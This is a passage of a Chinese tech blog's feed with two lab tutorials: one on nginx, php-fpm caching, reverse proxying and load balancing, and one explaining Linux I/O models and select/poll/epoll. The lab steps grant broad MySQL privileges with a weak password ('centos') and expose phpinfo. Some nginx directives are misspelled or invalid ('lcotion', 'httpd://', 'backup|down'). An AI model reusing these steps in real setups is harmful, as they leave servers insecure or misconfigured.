class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[root@lnmp ~]# yum install nginx php-fpm php-mysql mariadb -y</span><br><span class="line">[root@lnmp ~]# cp /etc/nginx/nginx.conf&#123;,.bak&#125;</span><br><span class="line">[root@lnmp ~]# vim /etc/nginx/nginx.conf</span><br><span class="line">http &#123;</span><br><span class="line">    fastcgi_cache_path /var/cache/nginx/fcgi_cache levels=1:2:1 keys_zone=fcgicache:20m inactive=120s;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80 default_server;</span><br><span class="line">        server_name  www.fenghong.tech;</span><br><span class="line">        root         /data/www;</span><br><span class="line">        location / &#123;</span><br><span class="line">                fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">                fastcgi_index index.php;</span><br><span class="line">                fastcgi_param SCRIPT_FILENAME /data/www/$fastcgi_script_name;</span><br><span class="line">                include fastcgi_params;</span><br><span class="line">                fastcgi_cache fcgicache; </span><br><span class="line">                fastcgi_cache_key $request_uri;</span><br><span class="line">                fastcgi_cache_valid 200 302 10m;</span><br><span class="line">                fastcgi_cache_valid 301 1h;</span><br><span class="line">                fastcgi_cache_valid any 1m;</span><br><span class="line">        &#125;</span><br><span class="line">        location ~* ^/(status|ping)$ &#123;</span><br><span class="line">                fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">                fastcgi_param  SCRIPT_FILENAME  $fastcgi_script_name;</span><br><span class="line">                include fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@lnmp ~]# vim /etc/php-fpm.d/www.conf</span><br><span class="line">pm.status_path = /status</span><br><span class="line">ping.response = pong</span><br><span class="line">ping.path = /ping</span><br><span class="line">[root@lnmp ~]# systemctl enable nginx.service php-fpm.service</span><br><span class="line">[root@lnmp ~]# systemctl start nginx.service php-fpm.service</span><br><span class="line">[root@lnmp ~]# mkdir /var/cache/nginx/</span><br><span class="line">[root@lnmp ~]# mkdir -pv /data/www/</span><br><span class="line">[root@lnmp ~]# vim /data/www/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">测试：</span><br><span class="line"># curl 192.168.0.8/status  #查看PHP的工作状态</span><br><span class="line">pool:                 www</span><br><span class="line">process manager:      dynamic</span><br><span class="line">start time:           07/Jul/2018:16:27:07 +0800</span><br><span class="line">start since:          1463</span><br><span class="line">accepted conn:        9</span><br><span class="line">listen queue:         0</span><br><span class="line">max listen queue:     0</span><br><span class="line">listen queue len:     128</span><br><span class="line">idle processes:       4</span><br><span class="line">active processes:     1</span><br><span class="line">total processes:      5</span><br><span class="line">max active processes: 1</span><br><span class="line">max children reached: 0</span><br><span class="line">slow requests:        0</span><br><span class="line"># curl 192.168.0.8/ping  #测试PHP进程是否工作</span><br><span class="line">pong</span><br><span class="line">访问 http://192.168.0.8/</span><br></pre></td></tr></table></figure><h2 id="ngx-http-upstream-module-反向代理调度模块"><a href="#ngx-http-upstream-module-反向代理调度模块" class="headerlink" title="ngx_http_upstream_module 反向代理调度模块"></a>ngx_http_upstream_module 反向代理调度模块</h2><p>用于将多个服务器定义成服务器组，而由proxy_pass, fastcgi_pass等指令进行引用，实现健康检查，负载均衡的功能</p><p>1）<strong>upstream</strong> name { … } 定义后端服务器组，会引入一个新的上下文，默认调度算法是wrr，在http中定义</p><p>2）<strong>server</strong> address [parameters]; 在upstream上下文中server成员，以及相关的参数</p><p>address：</p><ul><li>unix: /PATH/TO/SOME_SOCK_FILE  socket文件</li><li>IP[:PORT]  IP加端口</li><li>HOSTNAME[:PORT]  主机名加端口</li></ul><p>parameters：</p><ul><li>weight=number   权重，默认为1</li><li>max_conns  连接后端报务器最大并发活动连接数，1.11.5版本后支持</li><li>max_fails=number  失败尝试最大次数；超出此处指定的次数时，server将被标记为不可用,默认为1</li><li>fail_timeout=time   后端服务器标记为不可用状态的连接超时时长，默认10s</li><li>backup  将服务器标记为“备用”，即所有服务器均不可用时才启用</li><li>down  标记为“不可用”，配合ip_hash使用，实现灰度发布</li></ul><p>3）ip_hash  源地址hash调度方法</p><p>4）least_conn  最少连接调度算法，当server拥有不同的权重时其为wlc，当所有后端主机连接数相同时，则使用wrr，适用于长连接</p><p>5）hash key [consistent]</p><p>基于指定的key的hash表来实现对请求的调度，此处的key可以直接文本、变量或二者组合</p><p>将请求分类，同一类请求将发往同一个upstream server，使用consistent参数，将使用<strong>ketama一致性hash</strong>算法，适用于后端是Cache服务器（如varnish）时使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hash $request_uri consistent;</span><br><span class="line">hash $remote_addr;</span><br></pre></td></tr></table></figure><p>6）keepalive 连接数N：为每个worker进程保留的空闲的长连接数量,可节约nginx端口，并减少连接管理的消耗</p><p>7）health_check [parameters]; 健康状态检测机制；只能用于location上下文，<strong>仅对nginx plus有效</strong></p><ul><li>interval=time检测的频率，默认为5秒 </li><li>fails=number：判定服务器不可用的失败检测次数；默认为1次 </li><li>passes=number：判定服务器可用的失败检测次数；默认为1次 </li><li>uri=uri：做健康状态检测测试的目标uri；默认为/ </li><li>match=NAME：健康状态检测的结果评估调用此处指定的match配置块 </li></ul><p>8）match name { … } 对backend server做健康状态检测时，定义其结果判断机制；只能用于http上下文，<strong>仅对nginx plus有效</strong></p><ul><li>status  code[  code …]: 期望的响应状态码</li><li>header  HEADER[operator  value]：期望存在响应首部，也可对期望的响应首部的值基于比较操作符和值进行比较</li><li>body：期望响应报文的主体部分应该有的内容</li></ul><h1 id="实现proxy反向代理的动静分离缓存负载均衡。"><a href="#实现proxy反向代理的动静分离缓存负载均衡。" class="headerlink" title="实现proxy反向代理的动静分离缓存负载均衡。"></a>实现proxy反向代理的动静分离缓存负载均衡。</h1><p><img src="/images/1530955794774.png" alt="1530955794774"></p><h3 id="静态服务器的配置"><a href="#静态服务器的配置" class="headerlink" title="静态服务器的配置"></a>静态服务器的配置</h3><p>ip为<code>192.168.1.13</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y httpd</span><br><span class="line">]# vim /etc/httpd/conf/httpd.conf</span><br><span class="line">LogFormat \&quot;%&#123;X-Real-IP&#125;i\&quot; %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</span><br><span class="line">]# echo static html &gt; /var/www/html/index.html</span><br><span class="line">]# cp /var/log/messages-20180610 /var/www/html/m.txt  #生成大文件</span><br><span class="line">]# for i in &#123;1..10&#125; ;do echo page$i on 8 &gt; test$i.html;done    #在192.168.1.13运行</span><br><span class="line">]# service httpd restart</span><br></pre></td></tr></table></figure><h3 id="动态服务器配置"><a href="#动态服务器配置" class="headerlink" title="动态服务器配置"></a>动态服务器配置</h3><p>ip为<code>192.168.1.8</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y httpd php php-mysql mysql-server</span><br><span class="line">]# service httpd restart</span><br><span class="line">]# service mysqld start</span><br><span class="line">]# mysql -e &quot;grant all on *.* to test@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;&quot;</span><br><span class="line">]# cat /var/www/html/index.php #测试php联通mysql页面</span><br><span class="line">&lt;?php</span><br><span class="line">$dsn=&apos;mysql:host=192.168.1.8;dbname=mysql&apos;;</span><br><span class="line">$username=&apos;test&apos;;</span><br><span class="line">$passwd=&apos;centos&apos;;</span><br><span class="line">$dbh=new PDO($dsn,$username,$passwd);</span><br><span class="line">var_dump($dbh);</span><br><span class="line">?&gt;</span><br><span class="line">]# for i in &#123;1..10&#125; ;do echo page$i on 13 &gt; test$i.html;done#生成调度文件</span><br></pre></td></tr></table></figure><h3 id="nginx代理服务器"><a href="#nginx代理服务器" class="headerlink" title="nginx代理服务器"></a>nginx代理服务器</h3><p>ip为<code>192.168.1.18</code></p><ul><li>反代功能：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/nginx/conf.d/a.com.conf</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    proxy_pass http://192.168.1.8;</span><br><span class="line">&#125;</span><br><span class="line">location / &#123;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_pass http://192.168.1.13;</span><br><span class="line">&#125;</span><br><span class="line">lcotion /bbs &#123;</span><br><span class="line">    proxy_pass httpd://192.168.1.8/; #有url，将会把/bbs置换成/。</span><br><span class="line">    proxy_pass httpd://192.168.1.8； #无url，将会把/bbs补加在其后。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>缓存功能：</li></ul><p>proxy_cache_path  必须放在http{}语句块中，而后续的server语句块也要加入相应的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">]# mkdir -pv /var/cache/nginx/</span><br><span class="line">mkdir: created directory ‘/var/cache/nginx’</span><br><span class="line">]# vim /etc/nginx/nginx.conf</span><br><span class="line">···</span><br><span class="line">http &#123;</span><br><span class="line">···</span><br><span class="line">#开启缓存功能，与下面的缓存功能一起启用方可生效</span><br><span class="line">proxy_cache_path /var/cache/nginx/nginx_cache levels=1:1:1</span><br><span class="line">                        keys_zone=proxycache:20m</span><br><span class="line">                        inactive=120s max_size=1g;</span><br><span class="line">···</span><br><span class="line">]# vim /etc/nginx/conf.d/a.com.conf</span><br><span class="line">···</span><br><span class="line">    location / &#123;</span><br><span class="line">    ##代理功能</span><br><span class="line">        proxy_pass http://192.168.1.13/;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        ##缓存功能</span><br><span class="line">        proxy_cache proxycache;</span><br><span class="line">        proxy_cache_key $request_uri;</span><br><span class="line">        proxy_cache_valid 200 302 301 1h;</span><br><span class="line">        proxy_cache_valid any 1m;</span><br><span class="line">        #响应头部自定义添加，来自ngx_http_headers_module提供</span><br><span class="line">        add_header X-Via $server_addr;</span><br><span class="line">        add_header X-Cache $upstream_cache_status;</span><br><span class="line">        add_header X-Accel $server_name;</span><br><span class="line">        &#125;</span><br><span class="line">···</span><br><span class="line">]# nginx -s reload</span><br></pre></td></tr></table></figure><ul><li>调度功能</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/nginx/nginx.conf</span><br><span class="line">···</span><br><span class="line">http &#123;</span><br><span class="line">···</span><br><span class="line">upstream www &#123;</span><br><span class="line">least_conn;#最少连接算法，类似lvs中的wlc算法。</span><br><span class="line">#ip_hash;#源地址hash算法。</span><br><span class="line">#hash $request_uri [consistent];#对请求的uri进行hash后，对server的权重和取余</span><br><span class="line">#hash $remote_addr;  </span><br><span class="line">         server 192.168.1.8:80;</span><br><span class="line">         server 192.168.1.9:80 weight=3;</span><br><span class="line">         server 192.168.1.13:80 backup|down; #down的适合灰度发布中使用</span><br><span class="line">    &#125;</span><br><span class="line">···</span><br><span class="line">]# vim /etc/nginx/conf.d/a.com.conf</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://www;                                                          </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="client端访问测试"><a href="#client端访问测试" class="headerlink" title="client端访问测试"></a>client端访问测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">]# curl 172.20.5.24#出现下面页面说明反代成功</span><br><span class="line">static html</span><br><span class="line">]# curl 172.20.5.24/index.php    #出现下面页面说明反代成功</span><br><span class="line">object(PDO)#1 (0) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">]# curl 172.20.5.24/bbs</span><br><span class="line">webbs</span><br><span class="line"></span><br><span class="line">]# ab -c 100 -n 1000 http://172.20.5.24/m.txt</span><br><span class="line">···</span><br><span class="line">Requests per second:    40.07 [#/sec] (mean)  #缓存前</span><br><span class="line">···</span><br><span class="line">Requests per second:    68.24 [#/sec] (mean)#缓存后</span><br><span class="line">···</span><br><span class="line">]# curl -I 172.20.5.24/m.txt#后端的服务器相关内容都被隐藏了</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: honginx/6.6.6</span><br><span class="line">Date: Sat, 07 Jul 2018 12:43:20 GMT</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Length: 1288618</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Last-Modified: Sat, 07 Jul 2018 00:14:11 GMT</span><br><span class="line">ETag: &quot;28063c-13a9aa-5705da8e165e8&quot;</span><br><span class="line">X-Via: 172.20.5.24</span><br><span class="line">X-Cache: MISS</span><br><span class="line">X-Accel: www.a.com</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line">##测试调度功能</span><br><span class="line">]# for i in &#123;1..10&#125;;do curl 172.20.5.24/test$i.html;done</span><br><span class="line">page1 on 13</span><br><span class="line">page2 on 13</span><br><span class="line">page3 on 13</span><br><span class="line">page4 on 8</span><br><span class="line">page5 on 8</span><br><span class="line">page6 on 8</span><br><span class="line">page7 on 8</span><br><span class="line">page8 on 8</span><br><span class="line">page9 on 8</span><br><span class="line">page10 on 13</span><br></pre></td></tr></table></figure><blockquote><p>在客户端测试时不会看到调度的效果，想要看到调度的效果需要把缓存关闭</p></blockquote><p>感谢阅读！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Nginx" scheme="https://fenghong.tech/categories/Nginx/"/>
    
    
      <category term="server" scheme="https://fenghong.tech/tags/server/"/>
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="internet" scheme="https://fenghong.tech/tags/internet/"/>
    
  </entry>
  
  <entry>
    <title>I/O</title>
    <link href="https://fenghong.tech/io.html"/>
    <id>https://fenghong.tech/io.html</id>
    <published>2018-07-07T09:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>I/O模型;</li><li>同步，异步；</li><li>阻塞，非阻塞；</li><li>select/poll/epoll模型</li></ul><h2 id="Httpd-MPM"><a href="#Httpd-MPM" class="headerlink" title="Httpd MPM"></a>Httpd MPM</h2><blockquote><p>prefork：进程模型，两级结构，主进程master负责生成子进程，每个子进程负责响应一个请求<br>worker：线程模型，三级结构，主进程master负责生成子进程，每个子进程负责生成多个线程，每个线程响应一个请求<br>event：线程模型，三级结构,主进程master负责生成子进程，每个子进程响应多个请求</p></blockquote><h2 id="性能影响"><a href="#性能影响" class="headerlink" title="性能影响"></a>性能影响</h2><blockquote><p>有很多研究都表明，性能对用户的行为有很大的影响：</p><p>79%的用户表示不太可能再次打开一个缓慢的网站</p><p>47%的用户期望网页能在2秒钟以内加载</p><p>40%的用户表示如果加载时间超过三秒钟，就会放弃这个网站</p><p>页面加载时间延迟一秒可能导致转换损失7%，页面浏览量减少11%</p><p>8秒定律：用户访问一个网站时，如果等待网页打开的时间超过8秒，会有超过30%的用户放弃等待</p></blockquote><h1 id="I-O介绍"><a href="#I-O介绍" class="headerlink" title="I/O介绍"></a>I/O介绍</h1><ul><li>I/O:</li></ul><p>网络IO：本质是socket读取<br>磁盘IO：</p><ul><li>每次IO，都要经由两个阶段：</li></ul><p>第一步：将数据从磁盘文件先加载至内核内存空间（缓冲区），等待数据准备完成，时间较长<br>第二步：将数据从内核缓冲区复制到用户空间的进程的内存中，时间较短</p><ul><li>I/O模型</li></ul><blockquote><p>阻塞型、非阻塞型、复用型、信号驱动型、异步<br>同步/异步：关注的是消息通信机制<br>同步：synchronous，调用者等待被调用者返回消息，才能继续执行<br>异步：asynchronous，被调用者通过状态、通知或回调机制主动通知调用者被调用者的运行状态<br>阻塞/非阻塞：关注调用者在等待结果返回之前所处的状态<br>阻塞：blocking，指IO操作需要彻底完成后才返回到用户空间，调用结果返回之前，调用者被挂起<br>非阻塞：nonblocking，指IO操作被调用后立即返回给用户一个状态值，无需等到IO操作彻底完成，最终的调用结果返回之前，调用者不会被挂起</p></blockquote><ul><li>同步阻塞IO模型</li></ul><blockquote><p>同步阻塞IO模型是最简单的IO模型，用户线程在内核进行IO操作时被阻塞<br>用户线程通过系统调用read发起IO读操作，由用户空间转到内核空间。内核等到数据包到达后，然后将接收的数据拷贝到用户空间，完成read操作<br>用户需要等待read将数据读取到buffer后，才继续处理接收的数据。整个IO请求的过程中，用户线程是被阻塞的，这导致用户在发起IO请求时，不能做任何事情，对CPU的资源利用率不够</p></blockquote><p><img src="/images/1530668828665.png" alt="1530668828665"></p><ul><li>同步非阻塞IO模型</li></ul><blockquote><p>用户线程发起IO请求时立即返回。但并未读取到任何数据，用户线程需要不断地发起IO请求，直到数据到达后，才真正读取到数据，继续执行。即 “轮询”机制<br>整个IO请求的过程中，虽然用户线程每次发起IO请求后可以立即返回，但是为了等到数据，仍需要不断地轮询、重复请求，消耗了大量的CPU的资源<br>是比较浪费CPU的方式，一般很少直接使用这种模型，而是在其他IO模型中使用非阻塞IO这一特性</p></blockquote><p><img src="/images/1530668886961.png" alt="1530668886961"></p><ul><li><p>I/O多路复用模型</p><blockquote><p>多个连接共用一个等待机制，本模型会阻塞进程，但是进程是阻塞在select或者poll这两个系统调用上，而不是阻塞在真正的IO操作上<br>用户首先将需要进行IO操作添加到select中，继续执行做其他的工作（异步），同时等待select系统调用返回。当数据到达时，IO被激活，select函数返回。用户线程正式发起read请求，读取数据并继续执行。<br>从流程上来看，使用select函数进行IO请求和同步阻塞模型没有太大的区别，甚至还多了添加监视IO，以及调用select函数的额外操作，效率更差。并且阻塞了两次，但是第一次阻塞在select上时，select可以监控多个IO上是否已有IO操作准备就绪，即可达到在同一个线程内同时处理多个IO请求的目的。而不像阻塞IO那种，一次只能监控一个IO<br>虽然上述方式允许单线程内处理多个IO请求，但是每个IO请求的过程还是阻塞的（在select函数上阻塞），平均时间甚至比同步阻塞IO模型还要长。如果用户线程只是注册自己需要的IO请求，然后去做自己的事情，等到数据到来时再进行处理，则可以提高CPU的利用率<br>IO多路复用是最常使用的IO模型，但是其异步程度还不够“彻底”，因它使用了会阻塞线程的select系统调用。因此IO多路复用只能称为异步阻塞IO模型，而非真正的异步IO</p></blockquote></li><li><p>多路I/O复用</p></li></ul><blockquote><p>IO多路复用是指内核一旦发现进程指定的一个或者多个IO条件准备读取，就通知该进程<br>IO多路复用适用如下场合：<br>当客户端处理多个描述符时（一般是交互式输入和网络套接口），必须使用I/O复用<br>当一个客户端同时处理多个套接字时，此情况可能的但很少出现<br>当一个TCP服务器既要处理监听套接字，又要处理已连接套接字，一般也要用到I/O复用<br>当一个服务器即要处理TCP，又要处理UDP，一般要使用I/O复用<br>当一个服务器要处理多个服务或多个协议，一般要使用I/O复用</p></blockquote><p><img src="/images/1530668909616.png" alt="1530668909616"></p><ul><li>信号驱动IO模型</li></ul><blockquote><p>信号驱动IO：signal-driven I/O<br>用户进程可以通过sigaction系统调用注册一个信号处理程序，然后主程序可以继续向下执行，当有IO操作准备就绪时，由内核通知触发一个SIGIO信号处理程序执行，然后将用户进程所需要的数据从内核空间拷贝到用户空间<br>此模型的优势在于等待数据报到达期间进程不被阻塞。用户主程序可以继续执行，只要等待来自信号处理函数的通知<br>该模型并不常用</p></blockquote><p><img src="/images/1530669203824.png" alt="1530669203824"></p><ul><li>异步IO模型</li></ul><blockquote><p>异步IO与信号驱动IO最主要的区别是信号驱动IO是由内核通知何时可以进行IO操作，而异步IO则是由内核告诉用户线程IO操作何时完成。信号驱动IO当内核通知触发信号处理程序时，信号处理程序还需要阻塞在从内核空间缓冲区拷贝数据到用户空间缓冲区这个阶段，而异步IO直接是在第二个阶段完成后，内核直接通知用户线程可以进行后续操作了<br>相比于IO多路复用模型，异步IO并不十分常用，不少高性能并发服务程序使用IO多路复用模型+多线程任务处理的架构基本可以满足需求。目前操作系统对异步IO的支持并非特别完善，更多的是采用IO多路复用模型模拟异步IO的方式（IO事件触发时不直接通知用户线程，而是将数据读写完毕后放到用户指定的缓冲区中）</p></blockquote><p><img src="/images/1530669246670.png" alt="1530669246670"></p><ul><li>五种I/O模型</li></ul><p><img src="/images/1530669555976.png" alt="1530669555976"></p><h2 id="I-O模型的具体实现"><a href="#I-O模型的具体实现" class="headerlink" title="I/O模型的具体实现"></a>I/O模型的具体实现</h2><ul><li>主要实现方式有以下几种：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Select：Linux实现对应，I/O复用模型，BSD4.2最早实现</span><br><span class="line">Poll：Linux实现，对应I/O复用模型，System V unix最早实现</span><br><span class="line">Epoll：Linux实现，对应I/O复用模型，具有信号驱动I/O模型的某些特性</span><br><span class="line">Kqueue：FreeBSD实现，对应I/O复用模型，具有信号驱动I/O模型某些特性</span><br><span class="line">/dev/poll：SUN的Solaris实现，对应I/O复用模型，具有信号驱动I/O模型的某些特性</span><br><span class="line">Iocp Windows实现，对应第5种（异步I/O）模型</span><br></pre></td></tr></table></figure><h2 id="select-poll-epoll"><a href="#select-poll-epoll" class="headerlink" title="select/poll/epoll"></a>select/poll/epoll</h2><p>三种方式的对比：</p><p><img src="/images/1530669818941.png" alt="1530669818941"></p><p><img src="/images/1530670536060.png" alt="1530670536060"></p><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><ul><li>Select:POSIX所规定，目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点，本质上是通过设置或者检查存放fd标志位的数据结构来进行下一步处理</li><li>缺点</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单个进程可监视的fd数量被限制，即能监听端口的数量有限</span><br><span class="line">cat /proc/sys/fs/file-max</span><br><span class="line">对socket是线性扫描，即采用轮询的方法，效率较低</span><br><span class="line">select 采取了内存拷贝方法来实现内核将 FD 消息通知给用户空间，这样一个用来存放大量fd的数据结构，这样会使得用户空间和内核空间在传递该结构时复制开销大</span><br></pre></td></tr></table></figure><h3 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本质上和select没有区别，它将用户传入的数组拷贝到内核空间，然后查询每个fd对应的设备状态</span><br><span class="line">其没有最大连接数的限制，原因是它是基于链表来存储的</span><br><span class="line">大量的fd的数组被整体复制于用户态和内核地址空间之间，而不管这样的复制是不是有意义</span><br><span class="line">poll特点是“水平触发”，如果报告了fd后，没有被处理，那么下次poll时会再次报告该fd</span><br><span class="line">边缘触发：只通知一次</span><br></pre></td></tr></table></figure><h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">epoll：在Linux 2.6内核中提出的select和poll的增强版本</span><br><span class="line">支持水平触发LT和边缘触发ET，最大的特点在于边缘触发，它只告诉进程哪些fd刚刚变为就需态，并且只会通知一次</span><br><span class="line">使用“事件”的就绪通知方式，通过epoll_ctl注册fd，一旦该fd就绪，内核就会采用类似callback的回调机制来激活该fd，epoll_wait便可以收到通知</span><br><span class="line">优点:</span><br><span class="line">没有最大并发连接的限制：能打开的FD的上限远大于1024(1G的内存能监听约10万个端口)</span><br><span class="line">效率提升：非轮询的方式，不会随着FD数目的增加而效率下降；只有活跃可用的FD才会调用callback函数，即epoll最大的优点就在于它只管理“活跃”的连接，而跟连接总数无关</span><br><span class="line">内存拷贝，利用mmap(Memory Mapping)加速与内核空间的消息传递；即epoll使用mmap减少复制开销</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Nginx" scheme="https://fenghong.tech/categories/Nginx/"/>
    
    
      <category term="server" scheme="https://fenghong.tech/tags/server/"/>
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="internet" scheme="https://fenghong.tech/tags/internet/"/>
    
  </entry>
  
</feed>
